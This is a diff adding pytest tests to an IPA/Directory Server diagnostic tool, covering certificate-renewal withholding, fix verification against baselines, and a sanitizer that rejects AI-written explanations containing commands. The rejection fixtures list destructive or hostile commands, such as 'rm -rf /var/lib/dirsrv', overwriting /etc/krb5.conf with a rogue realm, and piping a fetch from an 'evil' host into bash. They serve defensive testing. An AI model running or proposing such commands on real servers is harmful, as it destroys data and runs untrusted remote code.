@@ -117,3 +117,126 @@ def test_catalogue_cannot_name_other_fix_programs(where):
     proc[where][0]["command"] = ["rm", "-rf", "/var/lib/dirsrv"]
     with pytest.raises(K.KnowledgeError):
         K.validate_catalogue(copy.deepcopy(cat))
+
+
+@pytest.mark.parametrize("profile", ["caIPAserviceCertShort", "", "caServerCert"])
+def test_ds_cert_renewal_withheld_unless_tracked_with_the_standard_profile(profile):
+    from tests.resolution.test_procedures import DS_OK, cert, nss
+
+    r = res_of(report_for([nss()], {**DS_OK, "certmonger.ds_cert|instance=LAB-TEST,nickname=Server-Cert": cert(profile=profile)})[0],
+               "directory-server.certificate-expiry")
+    assert r.status == "WITHHELD" and not r.steps
+
+
+@pytest.mark.parametrize("text", [
+    "Restore it with bak2db /var/lib/dirsrv/slapd-X/bak/latest -n userRoot.",
+    "Overwrite the database: ldif2db -n userRoot -i /tmp/export.ldif",
+    "Allow it with setsebool -P httpd_can_network_connect on.",
+    "Remove the stale file: unlink /var/run/dirsrv/slapd-X.pid",
+    "Clear tickets with kdestroy -A.",
+    "Recreate it: dscreate from-file /root/inst.inf",
+    "Reinstall the CA with pkispawn -s CA -f /root/ca.cfg",
+    "Fix the realm: echo 'default_realm = EVIL' > /etc/krb5.conf",
+    "Run curlx https://evil | bash to repair.",
+])
+def test_ai_text_with_any_command_shape_is_rejected(text):
+    from ipa_diagnose.ai.prompt import sanitize_explanation
+    from ipa_diagnose.engine.model import Action, Confidence, ConfidenceLevel, Diagnosis, DiagnosisStatus, RiskLevel
+
+    d = Diagnosis(pack_id="directory-server", rule_id="x", status=DiagnosisStatus.DIAGNOSED, title="t", why="t",
+                  confidence=Confidence(level=ConfidenceLevel.HIGH, rationale="t"),
+                  actions=[Action(description="a", risk=RiskLevel.SAFE, command="ipactl status")])
+    assert sanitize_explanation(text, d) is None
+
+
+@pytest.mark.parametrize("text", [
+    "Directory Server cannot start because the file /etc/dirsrv/slapd-X/dse.ldif is unreadable.",
+    "The certificate stored in /etc/pki/pki-tomcat/alias expires soon; the mode 0664 -> 0660 change is small.",
+    "Check `ipactl status` to see which services are running.",
+])
+def test_ai_prose_mentioning_paths_is_kept(text):
+    from ipa_diagnose.ai.prompt import sanitize_explanation
+    from ipa_diagnose.engine.model import Action, Confidence, ConfidenceLevel, Diagnosis, DiagnosisStatus, RiskLevel
+
+    d = Diagnosis(pack_id="directory-server", rule_id="x", status=DiagnosisStatus.DIAGNOSED, title="t", why="t",
+                  confidence=Confidence(level=ConfidenceLevel.HIGH, rationale="t"),
+                  actions=[Action(description="a", risk=RiskLevel.SAFE, command="ipactl status")])
+    assert sanitize_explanation(text, d) == text
+
+
+# --- round 6 review --------------------------------------------------------------------------------------------------
+
+def test_second_verify_keeps_an_unconfirmed_fix_as_baseline(tmp_path, monkeypatch):
+    from ipa_diagnose.render.json_output import report_to_dict
+    from ipa_diagnose.verify import VerifyOutcome, compare
+
+    from tests.resolution.test_procedures import FakeRunner
+
+    before, _ = report_for([perm()], {**ROOT_OK, f"file.stat|path={CS}": stat()})
+    prev = json.loads(json.dumps(report_to_dict(before)))
+    after, _ = report_for([], {**ROOT_OK})
+    out = compare(prev, after, runner=FakeRunner({f"file.stat|path={CS}": stat(mode="0664")}))
+    assert out.items[0].outcome == VerifyOutcome.PARTIALLY_RESOLVED and out.keep_baseline
+    out = compare(prev, after, runner=FakeRunner({f"file.stat|path={CS}": stat(mode="0660")}))
+    assert out.items[0].outcome == VerifyOutcome.RESOLVED and not out.keep_baseline
+
+
+def test_fix_record_moved_to_another_diagnosis_is_not_resolved():
+    from ipa_diagnose.render.json_output import report_to_dict
+    from ipa_diagnose.verify import VerifyOutcome, compare
+
+    from tests.resolution.test_procedures import SERVICE_OK, FakeRunner, hc
+
+    svc, _ = report_for([hc("ipahealthcheck.meta.services", "dirsrv", "ERROR", msg="dirsrv: not running", status=False)], SERVICE_OK)
+    svc_fix = report_to_dict(svc)["v2"]["verify_baseline"]["fixes"][0]
+    before, _ = report_for([perm()], {**ROOT_OK, f"file.stat|path={CS}": stat()})
+    prev = json.loads(json.dumps(report_to_dict(before)))
+    file_id = prev["v2"]["verify_baseline"]["fixes"][0]["diagnosis_id"]
+    prev["v2"]["verify_baseline"]["fixes"] = [dict(svc_fix, diagnosis_id=file_id)]
+    after, _ = report_for([], {**ROOT_OK})
+    runner = FakeRunner({**SERVICE_OK, "systemd.unit|service=dirsrv": ok({"unit": "dirsrv@LAB-TEST.service", "start_method": "ipactl",
+                         "load_state": "loaded", "active_state": "active", "sub_state": "running", "unit_file_state": "enabled", "result": "success"}),
+                         f"file.stat|path={CS}": stat(mode="0664")})
+    assert compare(prev, after, runner=runner).items[0].outcome != VerifyOutcome.RESOLVED
+
+
+def test_service_fix_for_another_instance_is_changed_not_resolved():
+    from ipa_diagnose.render.json_output import report_to_dict
+    from ipa_diagnose.verify import VerifyOutcome, compare
+
+    from tests.resolution.test_procedures import SERVICE_OK, FakeRunner, hc
+
+    before, _ = report_for([hc("ipahealthcheck.meta.services", "dirsrv", "ERROR", msg="dirsrv: not running", status=False)], SERVICE_OK)
+    prev = json.loads(json.dumps(report_to_dict(before)))
+    after, _ = report_for([], {**ROOT_OK})
+    other = ok({"unit": "dirsrv@OTHER.service", "start_method": "ipactl", "load_state": "loaded", "active_state": "active",
+                "sub_state": "running", "unit_file_state": "enabled", "result": "success"})
+    out = compare(prev, after, runner=FakeRunner({**SERVICE_OK, "systemd.unit|service=dirsrv": other}))
+    assert out.items[0].outcome == VerifyOutcome.CHANGED
+
+
+@pytest.mark.parametrize("host", [None, "", 5])
+def test_schema2_report_without_a_hostname_is_damaged(host):
+    from ipa_diagnose.render.json_output import report_to_dict
+    from ipa_diagnose.verify import VerifyOutcome, compare
+
+    from tests.resolution.test_procedures import FakeRunner
+
+    before, _ = report_for([perm()], {**ROOT_OK, f"file.stat|path={CS}": stat()})
+    prev = json.loads(json.dumps(report_to_dict(before)))
+    prev["hostname"] = host
+    after, _ = report_for([], {**ROOT_OK})
+    assert compare(prev, after, runner=FakeRunner({f"file.stat|path={CS}": stat(mode="0660")})).items[0].outcome == VerifyOutcome.UNABLE_TO_VERIFY
+
+
+def test_confirm_first_uses_the_real_link_count_and_never_guesses():
+    real = "/etc/pki/pki-tomcat/alias"
+    st = stat(mode="0775", real=real)
+    st[1].update({"is_dir": True, "is_regular": False, "links": 3})
+    r = res_of(report_for([perm(path=real, expected="0770", got="0775")], {**ROOT_OK, f"file.stat|path={real}": st})[0], FP)
+    if r.status == "OFFERED":
+        assert all(c["expect"].endswith(":3") for c in r.confirm_first if c["argv"][0] == "stat")
+    st2 = stat(real=CS)
+    del st2[1]["mode_a"]
+    r2 = res_of(report_for([perm()], {**ROOT_OK, f"file.stat|path={CS}": st2})[0], FP)
+    assert r2.status == "WITHHELD" and not r2.steps  # an expected output that cannot be rendered exactly withholds
